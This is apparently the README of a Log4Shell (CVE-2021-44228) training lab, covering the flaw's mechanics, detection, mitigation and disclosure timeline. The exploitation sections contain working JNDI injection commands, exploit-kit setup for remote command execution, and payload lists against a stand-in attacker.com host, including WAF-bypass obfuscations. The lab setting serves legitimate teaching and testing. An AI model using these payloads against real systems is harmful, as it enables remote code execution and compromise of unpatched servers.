# Log4Shell (CVE-2021-44228) Lab

## Description
Log4Shell is a critical Remote Code Execution (RCE) vulnerability in Apache Log4j 2, one of the most widely used Java logging frameworks. This vulnerability allows attackers to execute arbitrary code by injecting malicious JNDI lookups into log messages.

## Access
- **Vulnerable Application**: http://localhost:8089
- **LDAP Server**: No longer included (use external tools)

## Vulnerability Details
- **CVE**: CVE-2021-44228
- **CVSS Score**: 10.0 (Critical)
- **Affected Versions**: Log4j 2.0-beta9 to 2.14.1
- **Root Cause**: JNDI lookup feature enabled by default
- **Impact**: Remote Code Execution

## How Log4Shell Works

1. **User Input**: Attacker sends malicious payload
2. **Logging**: Application logs the input using Log4j
3. **JNDI Lookup**: Log4j processes ${jndi:ldap://} syntax
4. **External Request**: Log4j connects to attacker's server
5. **Code Execution**: Malicious class is loaded and executed

## Exploitation Examples

### 1. Basic Detection
```bash
# Test if vulnerable
curl -H "User-Agent: \${jndi:ldap://example.com/test}" http://localhost:8089
curl -H "X-Api-Version: \${jndi:ldap://example.com/test}" http://localhost:8089

# Common injection points
- User-Agent header
- X-Forwarded-For header
- X-Api-Version header
- Request parameters
- Form data
- JSON fields
```

### 2. Using Burp Collaborator
```bash
# Generate a Collaborator payload
${jndi:ldap://[collaborator-id].burpcollaborator.net/test}

# Inject in various locations
curl -H "User-Agent: \${jndi:ldap://xyz123.burpcollaborator.net/a}" http://localhost:8089
```

### 3. Using JNDI Exploit Kit
```bash
# Clone JNDI Exploit Kit
git clone https://github.com/pimps/JNDI-Exploit-Kit.git
cd JNDI-Exploit-Kit

# Start LDAP server
java -jar JNDI-Exploit-Kit.jar -L 0.0.0.0:1389 -H your-ip

# Inject payload
curl -H "X-Api-Version: \${jndi:ldap://your-ip:1389/Basic/Command/Base64/[base64-command]}" http://localhost:8089
```

### 4. Using rogue-jndi
```bash
# Install rogue-jndi
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package

# Start server
java -jar target/RogueJndi-1.1.jar --command "touch /tmp/pwned" --hostname "your-ip"

# Inject payload
curl -H "User-Agent: \${jndi:ldap://your-ip:1389/o=reference}" http://localhost:8089
```

## Payload Variations

### Basic Payloads
```bash
${jndi:ldap://attacker.com/a}
${jndi:ldaps://attacker.com/a}
${jndi:rmi://attacker.com/a}
${jndi:dns://attacker.com/a}
${jndi:iiop://attacker.com/a}
${jndi:corba://attacker.com/a}
${jndi:nds://attacker.com/a}
${jndi:nis://attacker.com/a}
```

### Bypass WAF/Filters
```bash
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
${${lower:j}ndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/a}
${${upper:j}ndi:${upper:l}${upper:d}${upper:a}${upper:p}://attacker.com/a}
${${::-j}ndi:ldap://attacker.com/a}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attacker.com/a}
```

### Advanced Payloads
```bash
# Using environment variables
${jndi:${env:PROTOCOL:-ldap}://attacker.com/a}

# Nested lookups
${${::-j}${::-n}${::-d}${::-i}:${${::-l}${::-d}${::-a}${::-p}}://attacker.com/a}

# URL encoding
${jndi:ldap://attacker.com%2fa}
```

## Detection Methods

### 1. Log Analysis
```bash
# Search for JNDI patterns in logs
grep -E "\$\{jndi:" /var/log/*.log
grep -E "\$\{.*:-.*\}" /var/log/*.log
```

### 2. Network Monitoring
- Monitor for outbound LDAP connections (port 389/636)
- Monitor for outbound RMI connections (port 1099)
- Watch for connections to unusual external IPs

### 3. Using Scanners
```bash
# log4j-scan
python3 log4j-scan.py -u http://localhost:8089

# Nuclei
nuclei -u http://localhost:8089 -t cves/2021/CVE-2021-44228.yaml
```

## Mitigation (Not Applied in Lab)

1. **Update Log4j**: Upgrade to version 2.17.1 or later
2. **JVM Flag**: Set `-Dlog4j2.formatMsgNoLookups=true`
3. **Remove JndiLookup Class**:
   ```bash
   zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
   ```
4. **Environment Variable**: Set `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`
5. **WAF Rules**: Block ${jndi: patterns

## Real-World Impact
- Affected millions of applications worldwide
- Used to compromise major organizations
- Led to ransomware attacks
- Cryptocurrency mining
- Data theft and espionage

## Timeline
- **2021-11-24**: Vulnerability reported to Apache
- **2021-12-09**: Public disclosure
- **2021-12-10**: Mass exploitation begins
- **2021-12-10**: Version 2.15.0 released (incomplete fix)
- **2021-12-13**: Version 2.16.0 released
- **2021-12-17**: Version 2.17.0 released
- **2021-12-28**: Version 2.17.1 released (final fix)

## Additional Resources
- [Apache Log4j Security Page](https://logging.apache.org/log4j/2.x/security.html)
- [CISA Alert](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance)
- [log4j-scan Tool](https://github.com/fullhunt/log4j-scan)
- [JNDI Exploit Kit](https://github.com/pimps/JNDI-Exploit-Kit)

## Important Note
This lab uses a simplified setup. In real-world scenarios, you would need:
- An LDAP/RMI server to serve malicious payloads
- A web server to host compiled Java classes
- Proper exploit chains for the target JVM version 